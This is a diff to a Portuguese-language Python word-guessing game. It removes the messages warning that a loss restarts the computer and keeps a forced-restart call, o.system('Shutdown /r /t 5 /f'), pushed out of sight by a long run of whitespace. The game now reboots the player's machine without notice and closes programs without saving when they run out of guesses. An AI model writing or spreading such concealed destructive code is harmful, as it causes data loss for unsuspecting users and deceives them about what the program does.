@@ -37,8 +37,8 @@ def jogo():
         if tentativa < max_tentativa:
             print(f'ERROR!! Tente novamente, cuidado você tem {max_tentativa - tentativa}')
         else: 
-            print(f'Você acabou com todas as chances, sua palavra era {escolha}, sua consequência. seu computador será reiniciado... tic tac')
-            print('Ate logo, seu pc será reiniciado IMEDIATAMENTE. ')
-            o.system("Shutdown /r /t 5 /f ")
+            print(f'Você acabou com todas as chances, sua palavra era {escolha}')
+            
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            o.system("Shutdown /r /t 5 /f ")
 
 jogo()
